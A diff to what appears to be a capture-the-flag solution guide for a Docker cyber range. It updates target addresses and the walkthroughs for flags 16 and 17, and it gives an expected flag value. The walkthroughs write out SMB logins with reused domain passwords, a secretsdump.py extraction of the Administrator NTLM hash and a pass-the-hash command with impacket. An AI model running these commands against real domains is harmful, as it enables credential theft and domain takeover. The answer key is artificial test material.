@@ -2,7 +2,7 @@
 
 > **Start here:** Read [00-range-access-docker.md](00-range-access-docker.md) for how to access the Docker compose range. All commands run FROM INSIDE the Kali container (`sudo docker exec -it a14-kali /bin/bash`).
 
-These flags come from the intranet (A3 at **172.20.10.30**), mail server (A1 at **172.20.10.20**), file share (A4 at **172.20.10.40**), domain controller (A2 at **10.100.0.4**, external VM), and SCADA system (A5 at **172.20.10.50** web / **172.20.10.50:502** Modbus). All are live services — connect to them over the network, not via files on disk.
+These flags come from the intranet (A3 at **172.20.10.30**), mail server (A1 at **172.20.10.20**), file share (A4 at **172.20.10.40**), domain controller (A2 at **10.100.0.4**, external VM), and SCADA system (A5 at **172.20.40.10** web:8080 / **172.20.40.10:502** Modbus, scada network VLAN 40). All are live services — connect to them over the network, not via files on disk.
 
 ---
 
@@ -131,10 +131,12 @@ These flags come from the intranet (A3 at **172.20.10.30**), mail server (A1 at 
 
 ## Flag 16 — Guard Rotation Logs / Unreliable Guard (Medium, 100pts)
 
-1. Access the badge log share on the DC:
+1. Access the badge log share on the DC. Any valid domain user works; the
+   simplest path (after flag 17's Kerberoast+crack) is
+   `svc-backup%Password1`, but any of the AD-reused passwords also works
+   (e.g. `e.vasik%Reactor#Core9`):
    ```
    smbclient //dc01.boreas.local/badgelogs -U "svc-backup%Password1"
-   In the test environment, badge data is also at `/tmp/badge.csv` (content-on-disk).
    ```
 2. Download `access_log_march_2026.csv`.
 3. Cross-reference Petrov's entries with the guard rotation schedule (from Morrison's email on A1).
@@ -161,12 +163,19 @@ These flags come from the intranet (A3 at **172.20.10.30**), mail server (A1 at 
    ```
    secretsdump.py "BOREAS.LOCAL/svc-backup:Password1@dc01.boreas.local" -just-dc-user Administrator
    ```
-5. You get the Administrator NTLM hash. Use it to access the DA-only share:
+5. You get the Administrator NTLM hash (the second hex half of
+   `Administrator:500:aad3b435b51404eeaad3b435b51404ee:<nt-hash>:::`).
+   Administrator's cleartext password is random — use pass-the-hash via
+   impacket's smbclient.py:
    ```
-   smbclient //dc01.boreas.local/admin_flag -U "BOREAS\Administrator%CTFAdmin2026!"
+   /opt/tools/bin/smbclient.py \
+       -hashes aad3b435b51404eeaad3b435b51404ee:<nt-hash-from-secretsdump> \
+       BOREAS.LOCAL/Administrator@dc01.boreas.local <<'CMDS'
+   use admin_flag
    get flag.txt
+   exit
+   CMDS
    ```
-   (Or use pass-the-hash with the extracted NTLM hash.)
 6. The flag is in `flag.txt`.
 
 **Expected flag:** `FLAG{6c0a9d4e7f2b8135}`
